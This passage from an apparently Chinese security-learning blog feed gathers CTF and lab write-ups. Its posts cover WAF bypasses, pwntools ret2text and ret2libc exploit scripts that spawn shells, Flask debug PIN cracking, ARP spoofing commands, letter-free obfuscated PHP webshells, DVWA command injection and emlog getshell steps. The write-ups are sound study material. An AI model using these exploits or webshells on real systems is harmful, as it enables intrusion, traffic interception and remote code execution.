base64.b16decode(result) result = base64.b32decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b32decode(result) print(result) 得到结果： base58 : 2BAja2VqXoHi9Lo5kfQZBPjq1EmZHGEudM5JyDPREPmS3CxrpB8BnC 在github上搜到了第三方库，下载使用解密即可 https://github.com/keis/base58]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Waf那些事]]></title>
    <url>%2F2019%2F01%2F25%2FWaf%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[介绍wafWaf是Web应用防火墙通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品 Waf通常有以下几类： 软件型waf以软件形式装在所保护的服务器上的waf，由于安装在服务器上，所以可以接触到服务器上的文件，直接检测服务器上是否存在webshell，是否有文件被创建等。 硬件型waf以硬件形式部署在线路中，支持多种部署方式，当串联到链路中时可以拦截恶意流量，在旁路监听模式时只记录攻击不进行拦截。 云waf一般以反向代理的形式工作，通过配置NS记录或CNAME记录，使对网站的请求报文优先经过waf主机，经过waf主机的过滤后，将认为无害的请求报文再发送给实际网站服务器进行请求，可以说是带防护功能的CDN 网站系统内置的waf网站系统内置的waf可以说是网站内置的过滤，直接镶嵌在代码中，相对来说自由度高，一般有以下几种情况： 输入参数强制类型转换 输入参数合法性检测 关键函数执行前，对经过代码流程的输入进行检测 对输入的数据进行替换后在继续执行代码流程 网站系统内置的waf与业务更加契合，在对安全与业务都比较了解的情况下，可以更少的收到误报与漏报。 waf判断判断网站是否存在waf主要有下面几种方法： sqlmap使用sqlmap自带的waf识别模块可以识别出waf的种类，想要了解详细的识别规则可以查看sqlmap的waf目录下的相关脚本，也可以按照其格式自主添加新的waf识别规则，写好规则文件后直接放到waf目录下即可 手工判断这个也比较简单，直接在相应网站的URL后面加上最基础的测试语句，比如union select 1,2,3%23 ,并且放在一个不存在的参数名中。 被拦截的表现为：页面无法访问，响应码不同，返回与正常请求网页时不同的结果等。 一些waf的绕过方法大小写混合在规则匹配时只针对了特定大写或特定小写的情况，在实战中可以通过混合大小写的方式进行绕过（现在几乎没有这样的情况） URL编码 极少数的waf不会对普通字符进行URL解码 还有一种情况就是URL二次编码，waf一般只进行一次解码，如果目标web系统的代码中进行了额外的URL解码，即可进行绕过。 替换关键字waf采用替换或者删除select/union这类敏感关键词的时候，如果只匹配一次则很容易绕过。 使用注释注释在截断sql语句中用的比较多，在绕过waf时主要使用其代替空格（/**/），适用于检测过程中没有识别注释或者替换掉了注释的waf。 多参数请求拆分对于多个参数拼接到同一条sql语句中的情况，可以将注入语句分割插入。 生僻函数使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数 寻找网站源站ip对于有云waf防护的网站而言，只要找到网站的ip地址，然后通过ip访问网站，就可以绕过云waf检测 常见的寻找网站ip的方法如下: 寻找网站的历史解析记录 多个不同区域ping网站，查看ip解析结果 寻找网站二级域名，NX，MX记录对应的ip 订阅网站邮件，查看邮件发送方的ip]]></content>
      <tags>
        <tag>读书心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc3]]></title>
    <url>%2F2019%2F01%2F24%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc3%2F</url>
    <content type="text"><![CDATA[在ret2libc2的基础上，将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 程序仍然开启了NX 拖入ida中查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No surprise anymore, system disappeard QQ.&quot;); printf(&quot;Can you find it !?&quot;); gets(&amp;s); return 0; } 仍然是在gets函数处利用，但是在程序中现在没有了system函数和/bin/sh字符串 这里就需要了解一下libc的作用 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序开启了ALSR，但是程序的低3位地址是不会变的，我们可以泄露出某个执行过的函数的低三位地址进而确定libc的版本 泄露某个函数的地址我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。 脚本如下： from pwn import * context.log_level = &apos;debug&apos; p = process(&apos;./ret2libc3&apos;) elf = ELF(&apos;./ret2libc3&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(elf.plt[&apos;puts&apos;])+&apos;aaaa&apos;+p32(elf.got[&apos;puts&apos;])) p.interactive() 我们可以通过此处泄露puts函数的地址 可以看到地址的低三位为ca0 下面我们可以确定libc的版本，我们可以用到LibcSearcher github地址为https://github.com/lieanu/LibcSearcher 当然这个工具的强大之处不只如此，我们可以把它当做第三方库来使用 引用说明文档的例子 from LibcSearcher import * #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型 obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90) obj.dump(&quot;system&quot;)#system 偏移 obj.dump(&quot;str_bin_sh&quot;)#/bin/sh 偏移 obj.dump(&quot;__libc_start_main_ret&quot;) 所以得到了libc的版本后，我们就可以获得libc中system函数和/bin/sh的地址 将LibcSearcher作为第三方库，最后的脚本为： from pwn import * from LibcSearcher import LibcSearcher p = process(&apos;./ret2libc3&apos;) elf = ELF(&apos;./ret2libc3&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(elf.plt[&apos;puts&apos;])+p32(0x08048618)+p32(elf.got[&apos;puts&apos;])) puts_addr = u32(p.recv(4)) libc = LibcSearcher(&apos;puts&apos;,puts_addr) libc_base = puts_addr - libc.dump(&apos;puts&apos;) system_addr = libc_base + libc.dump(&apos;system&apos;) binsh = libc_base + libc.dump(&apos;str_bin_sh&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(system_addr)+p32(0x08048618)+p32(binsh)) p.interactive() 调用完puts函数后我们让该函数返回到程序的主函数处脚本执行需要等待一会，可能是寻找libc较费时间 成功获得了shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc2]]></title>
    <url>%2F2019%2F01%2F23%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc2%2F</url>
    <content type="text"><![CDATA[查看程序保护机制 拖入ida查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;Something surprise here, but I don&apos;t think it will work.&quot;); printf(&quot;What do you think ?&quot;); gets(&amp;s); return 0; } 和ret2libc1一样，都是通过gets函数进行攻击 查看程序是否存在system 函数 void secure() { unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf((const char *)&amp;unk_8048760, &amp;input); if ( input == secretcode ) system(&quot;no_shell_QQ&quot;); } 寻找是否有/bin/sh字符串，但是该程序中并不存在 这里就涉及到了最基本的ROP技术 所以需要我们自己来读取字符串，我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”) exp: from pwn import * rop = ROP(&apos;./ret2libc2&apos;) p = process(&apos;./ret2libc2&apos;) elf = ELF(&apos;./ret2libc2&apos;) p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;gets&apos;])+p32(rop.search(8).address)+p32(elf.bss()+0x100)+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(elf.bss()+0x100)) p.sendline(&apos;/bin/sh&apos;) p.interactive() 其中 rop.search(8).address 是pwntools自带寻找gadgets的方法 成功获得权限]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc1]]></title>
    <url>%2F2019%2F01%2F22%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc1%2F</url>
    <content type="text"><![CDATA[试着运行程序 程序只有一个输入点，检查程序 程序开启了NX，拖进ida查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets(&amp;s); return 0; } 这里同样有gets函数，并且经检测需覆盖字符仍为112 发现了内置的system函数 void secure() { unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf(&quot;%d&quot;, &amp;input); if ( input == secretcode ) system(&quot;shell!?&quot;); } 但是并没有/bin/sh ,接着在ida中寻找/bin/sh 可以看到在0x08048720处存在/bin/sh 下面就可以构造exp了 from pwn import * p = process(&apos;./ret2libc1&apos;) elf = ELF(&apos;./ret2libc1&apos;) p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720)) p.interactive() 其中 &apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720) 这里的aaaa是执行system后的返回地址，因为执行完system后我们就获取了shell，所以返回地址就用不到了，可以随意写 可以看到成功获得了shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2text]]></title>
    <url>%2F2019%2F01%2F21%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2text%2F</url>
    <content type="text"><![CDATA[查看程序基本信息 开启了NX，代表着栈上的数据是不可执行的 运行程序看一下 程序只有一个输入点，下面将程序拖入ida int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets(&amp;s); printf(&quot;Maybe I will tell you next time !&quot;); return 0; } 看到了无输入限制的gets函数，我们接下来计算一下程序gets函数的返回地址 可以看到地址是0x62616164，下面计算我们需要填充的字节数 需要填充112个无用字符 接下来我们在ida中查看是否存在/bin/sh 在地址0x0804863A处存在/bin/sh 接下来编写shell脚本 from pwn import * p = process(&quot;./ret2text&quot;) p.recvuntil(&apos;anything?\n&apos;) p.sendline(&apos;a&apos;*112+p32(0x0804863A)) p.interactive() 成功获得权限]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask debug模式下pin码安全]]></title>
    <url>%2F2019%2F01%2F20%2Fflask-debug%E6%A8%A1%E5%BC%8F%E4%B8%8Bpin%E7%A0%81%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[flask在开启debug模式时其会生成一个pin码，在同一台机器上，多次重启Flask服务，PIN码值不改变。 这说明PIN码是经过运算生成而不是随机生成的，经过网络搜索，我找到了生成pin 码的流程，生成的pin 码主要由6个值决定的 当前计算机的用户名 flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py 当前计算机网卡的Mac地址(linux下获取该值可以访问：/sys/class/net/eth0(eth1,ens33,eth2)/address) win下SOFTWARE\Microsoft\Cryptography注册表的值或者Linux下某个固定文件的值（Linux下访问/etc/machine-id 或 /proc/sys/kernel/random/boot_id） 在默认配置里找到代码并将其修改，得到猜解pin码的脚本 import hashlib from itertools import chain def get_pin(mac): probably_public_bits = [ &apos;SUN&apos;,# username &apos;flask.app&apos;,# modname &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) &apos;E:\\flask-file\\flask\\lib\\site-packages\\flask\\app.py&apos; # getattr(mod, &apos;__file__&apos;, None), ] private_bits = [ mac ,#&apos;55069833074577&apos;,# str(uuid.getnode()), /sys/class/net/eth0(eth1,ens33,eth2)/address &apos;2aa76823-5ed2-44aa-97de-ac3f97b955e2&apos;# get_machine_id(), /etc/machine-id , /proc/sys/kernel/random/boot_id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&apos;utf-8&apos;) h.update(bit) h.update(b&apos;cookiesalt&apos;) cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20] num = None if num is None: h.update(b&apos;pinsalt&apos;) num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) if __name__ == &apos;__main__&apos;: maclist = [&apos;55069833074577&apos;,&apos;1099493587180&apos;,&apos;115366132066698&apos;,&apos;117565155322249&apos;,&apos;345052807176&apos;,&apos;115366132066697&apos;] for mac in maclist: get_pin(mac) 这里用本地环境验证一下 故意将代码写错以触发debug模式 点击最右侧的小图标会让我们输入pin码 现在我们开始计算PIN码 用户名：SUN flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py [‘55069833074577’,’1099493587180’,’115366132066698’,’117565155322249’,’345052807176’,’115366132066697’] 2aa76823-5ed2-44aa-97de-ac3f97b955e2 运行脚本会计算出6个pin 码 231-484-767 177-131-120 142-563-096 112-007-296 244-772-099 236-421-014 经过测试,244-772-099是正确的pin码 linux下调试可用： import os os.popen(&quot;ls /&quot;).read() 这里有几个坑需要注意一下： E:\flask-file\flask\lib\site-packages\flask\app.py windows下是不区分大小写的，有时应将路径的大写字母改为小写字母 E:\flask-file\flask\lib\site-packages\flask\app.py 这个路径有时也会是E:\flask-file\flask\lib\site-packages\flask\app.pyc Linux下，第六个数值在获取时，当/etc/machine-id文件显示无任何内容时，可能是该文件为空或者是不存在，这两者是有区别的，当该文件为空时，第六个数值就是“” 而当文件不存在时，第六个数值是/proc/sys/kernel/random/boot_id文件的值]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARP欺骗原理及实例]]></title>
    <url>%2F2019%2F01%2F19%2FARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[arp协议简介arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的 arp欺骗原理每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回包中的ip和Mac地址对应的关系添加到arp缓存表中。 实例复现这里使用一台winxp和kali虚拟机 ip分别是192.168.18.131,192.168.18.135 这里我们为的是侦测到目标机的某些网络活动，所以在开始欺骗之前需要开启ip转发，不然在操作时目标主机会出现断网的情况 echo 1 &gt; /proc/sys/net/ipv4/ip_forward kali下arp攻击工具是arpspoof，具体的命令可在百度上查询到或者使用arpspoof -h 查看口令 arpspoof -i eth0 -t 192.168.18.131 192.168.18.135 开始修改目标机上的缓存表 开始嗅探目标机上的网络活动 dsniff -i eth0 这就完成了一次arp欺骗攻击，我们就可以捕捉到目标机的网络活动了]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无数字和字母的webshell]]></title>
    <url>%2F2019%2F01%2F18%2F%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell%2F</url>
    <content type="text"><![CDATA[先看一下这个例子 &lt;?php if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) { eval($_GET[&apos;shell&apos;]); } 这算是一个极限利用了，要求我们不用数字和字母构造webshell 这样的问题我们可以类比于各类变形的一句话木马，用异或的方式得到一个新的字符，这时我们就可以用非数字和字母的字符串将数字或者字母异或出来 异或例如这个 &lt;?php $_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;; $__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;; $___=$$__; $_($___[_]); // assert($_POST[_]); 部分数字是由于URL编码的原因，实际上是不包含数字的 取反运算还有一种方法我们可以使用~取反运算 例如这个 &lt;?php $__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;); $_=$__/$__; $____=&apos;&apos;; $___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__}); $_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_}); $_=$$_____; $____($_[_]);// assert($_POST[_]); 原理就是用UTF-8编码的汉字，将其中的某个字符取出，然后取反，就可以得到想要的字母 自增运算例如这个 &lt;?php @$_=[].&apos;&apos;; @$___=$_[&apos;&apos;]; $_=$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____; @$___($_[_]);// assert($_POST[_]); ?&gt; 我们可以拿到一个为a的变量，通过自增操作，即可获得a-z的任意一个字符，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’,’c’++ =&gt; ‘d’ 而在PHP中，数组和字符串若强制连接的话，数组也就会转换成字符串，即array 所以我们取字符串的第一个字母就可以得到a了]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行漏洞小结]]></title>
    <url>%2F2019%2F01%2F17%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[当应用程序调用一些可执行命令的函数，如PHP中 eval assert systempreg_replace call_user_func 等等函数，当函数参数变成可控参数时就可以将恶意的命令拼接到正常命令中，造成命令执行 这里在本地搭建了dvwa 环境进行漏洞的测试 进入命令执行测试界面 输入点输入ip可以执行ping命令 接下来看一下源代码(low) &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 代码对于输入的命令没有温和过滤，可以利用管道符来执行我们想执行的命令 Linux常见的管道符这里也做一下总结： “；”：执行完前面的语句在执行后面的 “|”：显示后面语句的执行结果 “||”：当前面语句执行出错时，执行后面的语句 “&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 “&amp;&amp;”：如果前面的语句为假则直接出错，不执行后面的，前面的语句只能为真 这里我们输入127.0.0.1|whoami 成功的执行了“|”后面的命令 然后分别查看medium和high级别的黑名单代码段 可以看到medium等级只过滤了“&amp;&amp;”和“；” ，我们仍然可以用“|”绕过 对于high等级，我们可以用127.0.0.1&amp;|&amp;whoami进行绕过 命令执行常出现在可以执行某些命令的模块，并且该模块具有可控的输入点，如果过滤做的没有那么完整，很可能触发命令执行漏洞 几点避免命令执行漏洞的建议 尽量不要使用命令执行函数 客户端提交的变量在进入命令执行函数前要做好过滤和检测 对于PHP语言，不能完全控制的危险函数最好不要用]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[file_put_contents()的妙用]]></title>
    <url>%2F2019%2F01%2F16%2Ffile-put-contents-%E7%9A%84%E5%A6%99%E7%94%A8%2F</url>
    <content type="text"><![CDATA[今天偶然在群里看到这个骚操作 file_put_contents()第二个参数是可以传入数组的，那么在存在某些正则校验的时候，就可能带来绕过的可能 例如有如下代码 &lt;?php $text = $_GET[&apos;text&apos;]; if(preg_match(&apos;[&lt;&gt;?]&apos;, $text)) { die(&apos;fuck!!!!&apos;); } file_put_contents(&apos;shell.php&apos;, $text); 如果我们想写入一个php文件,正常的话传入 text = &lt;?php phpinfo(); 会被正则匹配到，无法写入 如果我们将本段代码以数组的形式传入，数组会强制转化为字符串，这样就绕过了正则的匹配，达到了getshell的目的 虽然出现了Warning，但是文件是被写入了的]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP利用回溯次数限制绕过]]></title>
    <url>%2F2019%2F01%2F15%2FPHP%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[回溯绕过这里以i春秋圣诞欢乐赛中一道题为例代码如下 &lt;?php function areyouok($greeting){ return preg_match(&apos;/Merry.*Christmas/is&apos;,$greeting); } $greeting=@$_POST[&apos;greeting&apos;]; if(!areyouok($greeting)){ if(strpos($greeting,&apos;Merry Christmas&apos;)!==false){ echo &apos;Merry Christmas. &apos;.&apos;flag{259efcb4-bb57-4967-8aa8-8271f04f655a}&apos;; }else{ echo &apos;Do you know .swp file?&apos;; } }else{ echo &apos;Do you know PHP?&apos;; } ?&gt; 题目虽然有更简单的解法，但是为了说明问题，我们来讨论如何绕过正则 PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限，这个上限默认是100万 所以当我们向其发送100万个a然后在发送Merry Christmas就可以绕过正则的校验，函数会返回NULL，也就符合了题目要求 什么是正则表达式比较规范的说法是：正则表达式是一个可以被“有限状态自动机”接受的语言类。 常见的正则引擎有DFA和NFA，分别叫做确定性有限状态自动机和非确定性有限状态自动机 其中NFA的执行过程存在回溯，PHP就使用了NFA引擎，其中PCRE库属于NFA引擎]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018安恒12月赛复现]]></title>
    <url>%2F2019%2F01%2F13%2F2018%E5%AE%89%E6%81%9212%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[WEBeasy题目是如下代码 &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { public $file; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } if (isset($_GET[&apos;data&apos;])) { $data = $_GET[&apos;data&apos;]; preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches); if(count($matches)) { die(&apos;Hacker!&apos;); } else { $good = unserialize($data); echo $good; } } else { highlight_file(&quot;./index.php&quot;); } ?&gt; 很显然是一个反序列化漏洞 将参数改为flag.php即可读取到flag文件 生成poc的代码如下 &lt;?php @error_reporting(1); class baby { public $file = &quot;flag.php&quot;; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } $a = new baby(); echo serialize($a); ?&gt; 本地访问页面生成的反序列化字符串为： O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 将该串内容作为data的值传入，发现被waf拦截 仔细查看题目正则部分，用+4绕过即可 ezweb2使用御剑扫描目录发现了admin.php文件，访问后提示： 提示不是admin，下意识的查看cookie 将user部分base64解码得到user,我们将admin base64编码后将其替换 进入到后台 发现可以命令执行，但是过滤了空格 空格可以使用$IFS绕过 ls$IFS/ 读取flag文件 MISC学习资料拿到文件后很明显是明文攻击 跑出密码 打开解压后的Word文档，将图片移走，得到flag JUJU题目提示有11只猪，而打开图片明显数量不足，尝试修改图片高度 发现了base32编码 解密后得到flag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化总结]]></title>
    <url>%2F2019%2F01%2F12%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[漏洞成因Demo： &lt;?php class A{ public $target = &quot;demo&quot;; function __destruct(){ echo &quot;destructing!&lt;br/&gt;&quot;; echo $this-&gt;target.&quot;&lt;br/&gt;&quot;; echo &quot;destructed!&lt;br/&gt;&quot;; } } $a = $_GET[&apos;test&apos;]; $a_unser = unserialize($a); ?&gt; 在这里我们可以构造一个对象，控制$test的值，以实现控制数据流的目的 生成序列化字符串： &lt;?php class A{ public $target = &quot;w2t3rp2dd13r&quot;; } $a = serialize(new A); echo $a; ?&gt; 常见绕过方式_wakeup绕过： wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。 &lt;?php class A{ function __wakeup(){ echo &apos;Hello&apos;; } } $c = new A(); $d=unserialize(&apos;O:1:&quot;A&quot;:0:{}&apos;); ?&gt; 存在wakeup函数，所以会输入hello &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; 这里会输出student的实例序列化字符串 O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}} student后的3代表该类存在3个属性 而当该属性大于真实值时代码就会跳过_wakeup()函数执行 所以当输入序列化字符串为： O:7:”Student”:4:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 时，就不会执行_wakeup()函数。]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog后台数据备份getshell]]></title>
    <url>%2F2019%2F01%2F11%2Femlog%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BDgetshell%2F</url>
    <content type="text"><![CDATA[此漏洞适用版本&lt;= 5.1.2 漏洞原理是通过在恢复数据库备份时插入恶意代码，以达到getshell的目的 首先登陆到博客后台，进入数据备份和恢复功能 点击开始备份，我们会在本地生成一个数据库文件 要getshell，我们可以在得到的数据库文件中插入生成恶意文件的代码，但是我们需要知道该站点在服务器中的绝对路径 经过审计发现在admin/index.php中存在如下代码 这样我们只需访问127.0.0.1/admin/index.php?action=phpinfo就可以触发phpinfo()函数进而得到绝对路径了 有了绝对路径我们就可以在数据库备份文件中插入如下代码 这里调用了mysql语句，在目录下生成yml.php的文件 把代码插入到数据备份中 再次进入emlog后台，利用数据恢复功能，将修改过的备份文件导入 我们看下admin录下是否存在yml.php文件 可以看到成功在admin目录下生成了可执行PHP文件，在实战中可将该文件变成一句话木马，进行下一步的操作]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
